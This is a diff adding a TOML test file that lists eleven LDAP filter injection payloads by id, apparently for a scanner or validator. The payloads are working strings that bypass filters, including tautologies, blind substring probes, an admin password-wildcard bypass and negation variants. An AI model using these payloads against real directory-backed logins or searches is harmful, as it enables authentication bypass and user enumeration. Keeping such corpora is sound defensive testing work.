@@ -1,0 +1,57 @@
+schema = 1
+# LDAP filter injection.
+
+[[case]]
+id = "tautology_or_uid"
+class = "ldap"
+payload = "*)(uid=*))(|(uid=*"
+
+[[case]]
+id = "tautology_and_obj"
+class = "ldap"
+payload = "*)(&(objectClass=*"
+
+[[case]]
+id = "wildcard_cn"
+class = "ldap"
+payload = "*)(cn=*))(|(cn=*"
+
+[[case]]
+id = "boolean_true"
+class = "ldap"
+payload = "*)(uid=admin"
+
+[[case]]
+id = "always_true_filter"
+class = "ldap"
+payload = "*)(|(uid=*"
+
+[[case]]
+id = "blind_substring"
+class = "ldap"
+payload = "*)(uid=a*"
+
+[[case]]
+id = "blind_present"
+class = "ldap"
+payload = "*)(objectClass=*"
+
+[[case]]
+id = "username_admin_anon"
+class = "ldap"
+payload = "admin)(&(password=*))"
+
+[[case]]
+id = "double_filter_close"
+class = "ldap"
+payload = ")(|(cn=*"
+
+[[case]]
+id = "with_extensible_match"
+class = "ldap"
+payload = "*)(uid:dn:=admin"
+
+[[case]]
+id = "negation"
+class = "ldap"
+payload = "*)(!(uid=foo"
